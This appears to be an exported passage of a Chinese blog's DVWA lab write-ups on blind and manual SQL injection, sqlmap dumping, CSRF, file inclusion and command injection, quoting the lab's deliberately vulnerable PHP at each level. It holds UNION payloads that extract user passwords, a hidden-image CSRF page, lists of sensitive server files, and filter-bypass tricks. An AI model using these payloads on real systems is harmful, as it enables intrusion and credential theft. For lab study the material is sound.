first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; Medium：查看源码： 1234567891011121314151617181920212223242526&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close();&#125;?&gt; 还是抓包，然后修改上传数据，大体同SQL Injection （Medium） High：查看源码： 12345678910111213141516171819202122232425262728293031323334 &lt;?phpif( isset( $_COOKIE[ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_COOKIE[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Might sleep a random amount if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) ); &#125; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到当SQL语句查询为空的时候，会随机执行sleep()函数，并随机延迟2~4秒，那么用时间盲注就可能被影响，因此这关用布尔盲注。具体同Low级别一样。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—SQL Injection","date":"2021-03-09T13:20:45.370Z","path":"2021/03/09/DVWA—SQL Injection/","text":"前言：之前有刷过sqlilabs，前言就不再介绍了。 Low：手工注入：1）判断是否存在注入点，注入点是字符型还是数字型 1’ and ‘1’=’1，成功 1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为&#39; 2）猜解SQL查询语句中的字段数 1’ order by 1#不报错； 1’ order by 2#不报错； 1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。 3）判断回显位 0’ union select 1,2#![1](DVWA—SQL Injection/1.png) 有两个回显位。 4）爆库 0’ union select 1,database()#![2](DVWA—SQL Injection/2.png) 5）爆表 0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png) 6）爆列 0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’# ![4](DVWA—SQL Injection/4.png) 7）爆值 0’ union select user,password from users# ![5](DVWA—SQL Injection/5.png) 或0’ union select 1,group_concat(user,0x3a,password) from users# ![6](DVWA—SQL Injection/6.png) 利用sqlmap自动注入：1）获取所有数据库 sqlmap.py -u “url” –cookie “cookie中的内容” –dbs sp： -u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 ​ –dbs：获取所有数据库 2）查询当前数据库名 sqlmap.py -u “url” –cookie “cookie中的内容” –current-db sp： –current-db：查询当前数据库昵称 3）查表名 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables sp：-D：指定数据库 –table：查询所有表 ​ –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行) 4）查列名 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns sp：-T：指定表名 ​ –columns：查询所有列 5）查值 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump sp：-C：指定columns 如果不指定,默认整表 查看源码： 1234567891011121314151617&lt;?php if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; Medium：查看源码： 12345678910111213141516171819202122232425262728293031323334&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; //Get input* $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; //Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; 我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png) High：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; 我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面 ![8](DVWA—SQL Injection/8.png) 但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 Impossible：查看源码： 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; https://www.cnblogs.com/leezhxing/p/5282437.html","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—Cross Site Request Forgery (CSRF)","date":"2021-03-04T10:16:08.000Z","path":"2021/03/04/DVWA—CSRF/","text":"前言： CSRF，全称Cross-site request forgery，译为跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。需要注意的是，受害者需要使用含有效cookie的浏览器访问攻击者的页面时才会触发csrf攻击。 Low:查看源码： 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到服务器没有任何的防CSRF机制。那么我们可以构造404网页进行访问欺骗，编写test.html，内容为： 123&lt;img src=&quot;http://localhost:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt; 当受害者点击test.html时，就相当于攻击者利用受害者的cookie（即利用受害者的身份）进行了修改受害者账户密码这样一个操作。服务器那边会误以为是受害者自己下达的改密码的指令，而受害者会以为自己点到了一个失效的url，页面返回404,，但是其实这时受害者的密码已经被悄悄更改。可想而知CSRF的危害性多么大。 Medium：查看源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到服务器检查变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数的值），以抵御CSRF攻击。 我们先在原页面上提交修改密码请求，burp抓包： 再模拟CSRF攻击，burp抓包： 我们可以看到如果按照low级别的CSRF攻击是肯定不可能攻击成功的，因为它缺少了Referer的值。因此我们需要手动添加 Referer: localhost:81 High:查看源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—File Inclusion","date":"2021-02-28T11:26:47.000Z","path":"2021/02/28/DVWA—File Inclusion/","text":"前言：File Inclusion，译为文件包含（漏洞）。服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件。此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。 文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。 本地文件包含漏洞：通过浏览器包含web服务器上的文件，这种漏洞是因为服务器包含文件时没有进行严格的过滤，直接允许并执行用户在url输入的服务器包含文件。通俗的说就是被包含的文件在服务器本地。 远程文件包含漏洞：服务器开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。在远程服务器上预先设置好的webshell，然后攻击者利用该漏洞包含一个远程的文件。这种漏洞的出现是因为服务器对用户的输入没有进行检查，会导致不同程度的信息泄露。通俗的说就是被包含的文件不在目标服务器。 常见的敏感信息路径 利用本地文件包含漏洞可以获取系统（服务器）的本地文件的内容。Windows系统常见敏感文件如下： c:\\boot.ini 系统版本信息c:\\xxx\\php.ini PHP配置信息。c:\\xxx\\my.ini MySQL配置信息。c: \\xxx\\httpd.conf Apache配置信息。linux系统常见敏感文件如下： /etc/passwd Linux系统账号信息。/etc/httpd/conf/httpd.conf Apache配置信息。/etc/my.conf MySQL配置信息。/usr/etc/php.ini PHP配置信息。 常见路径符号 / 根目录./ 当前目录../ 返回到上一级目录../../ 返回上两级目录.\\ 、..\\和./、../ 意义相同 Low：查看源码： 123456&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; 我们可以看到，服务器端对page参数没有做任何的过滤跟检查。 利用本地文件包含漏洞 我们先让参数page的值等于一个服务器本地不存在的文件![1](DVWA—File Inclusion/1.png) 我们可以看到网站的根目录为\\DVWA-master\\，而index.php文件距根目录差两个文件夹，那么我们可以通过两个../回到根目录，然后去访问一些敏感文件：如PHP版本信息等。![2](DVWA—File Inclusion/2.png) 利用远程文件包含漏洞 因为我们搭的是靶场模拟服务器，那dvwa（81端口）靶场就相当于一个服务器，我们再在“远端服务器”127.0.0.1下上传文件1.txt内容为： 123&lt;?php phpinfo();?&gt; 然后利用远程文件包含访问![3](DVWA—File Inclusion/3.png) Medium：查看源码： 12345678910&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; 我们可以看到服务器过滤了http://, https://，../, ..\\，但是我们只要用双写就可以绕过了 ![4](DVWA—File Inclusion/4.png) ![5](DVWA—File Inclusion/5.png) High：查看源码： 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; 新函数： fnmatch() 函数 功能：根据指定的模式来匹配文件名或字符串。 语法：fnmatch(pattern,string,flags) 参数 描述 pattern 必需。规定要检索的模式。 string 必需。规定要检查的字符串或文件。 flags 可选。 我们可以看到服务器规定只能包含以file开头的文件，但是我们可以利用file协议绕过。 file协议主要用于访问本地计算机中的文件，当我们用浏览器打开一个本地文件时利用的就是file协议![6](DVWA—File Inclusion/6.png) file协议的基本格式：file:///文件路径 由于file协议规定只能由于访问本地文件，因此搭配文件上传漏洞效果极佳。![7](DVWA—File Inclusion/7.png) Impossible：查看源码： 1234567891011121314Impossible File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA——Command Injection","date":"2021-02-25T12:24:15.000Z","path":"2021/02/25/DVWA—Command Injection/","text":"前言：命令注入——利用可以调用系统命令的web应用，通过构造特殊命令字符串的方式，把恶意代码输入一个编辑域(例如缺乏有效验证的输入框)来改变网页动态生成的内容，最终实现本应在服务端才能工作的系统命令。命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。 &amp;，&amp;&amp;，|，||命令拼接符的区别: A&amp;B 拼接，A和B之间无制约关系 A&amp;&amp;B A执行成功，之后才会执行B A|B A的输出作为B的输入 A||B A执行失败，之后才会执行B A;B ; 分号表示命令依次执行。 windows系统下常见的拼接命令： ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 Linux命令大全：https://www.runoob.com/linux/linux-command-manual.html Low:查看源码： 1234567891011121314151617&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 新函数： php_uname()函数 功能：返回运行 PHP 的系统的有关信息。 语法：php_uname ([ string $mode = “a” ] ) 其中，mode 是单个字符，用于定义要返回什么信息： &#39;a&#39;：此为默认。包含序列 &quot;s n r v m&quot; 里的所有模式。 &#39;s&#39;：操作系统名称。例如： FreeBSD。 &#39;n&#39;：主机名。例如： localhost.example.com。 &#39;r&#39;：版本名称，例如： 5.1.2-RELEASE。 &#39;v&#39;：版本信息。操作系统之间有很大的不同。 &#39;m&#39;：机器类型。例如：i386。 shell_exec()函数 功能：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。（补充：Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。） 语法：shell_exec ( string $cmd ) 其中参数cmd为要执行的命令。 查看源码我们可知，服务器通过stristr和php_uname两个函数来判断操作系统，执行不同的ping命令。同时服务器没有对我们输入的IP地址做任何的过滤处理，我们可以利用任意的命令执行分隔符来执行我们的指令、获取我们想要的信息。 例如输入：127.0.0.1&amp;&amp;echo “hello world” ![1](DVWA—Command Injection/1.png) Medium:查看源码： 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 新函数： str_replace()函数 功能：替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是一个数组，那么它将返回一个数组。 如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。 如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。 如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 补充：该函数是区分大小写的。 str_ireplace() 函数执行不区分大小写的搜索。 语法：str_ireplace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 array_keys() 函数 功能：返回包含数组中所有键名的一个新数组。 语法：array_keys(array,value,strict) 参数 描述 array 必需。规定数组。 value 可选。您可以指定键值，然后只有该键值对应的键名会被返回。 strict 可选。与 value 参数一起使用。 可能的值：true - 返回带有指定键值的键名。依赖类型，数字 5 与字符串 “5” 是不同的； false - 默认值。不依赖类型，数字 5 与字符串 “5” 是相同的。 ​ 菜鸟实例： 12345&lt;?php$a&#x3D;array(&quot;Volvo&quot;&#x3D;&gt;&quot;XC90&quot;,&quot;BMW&quot;&#x3D;&gt;&quot;X5&quot;,&quot;Toyota&quot;&#x3D;&gt;&quot;Highlander&quot;);print_r(array_keys($a));?&gt;运行结果：Array ( [0] &#x3D;&gt; Volvo，[1] &#x3D;&gt; BMW ，[2] &#x3D;&gt; Toyota ) 通过查看源码我们发现服务器设置了黑名单过滤了字符&amp;&amp;和;，但是我们可以是用&amp;替代，&amp;;&amp;绕过的方式避开黑名单。 High：查看源码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 通过查看源码我们看到服务器对黑名单进行了补充，但是发现黑名单禁用的是&#39;| &#39;(这个里面有个空格)，而不是&#39;|&#39;，那么也就是说|命令指令符未被禁用。 Impossible：查看源码： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . 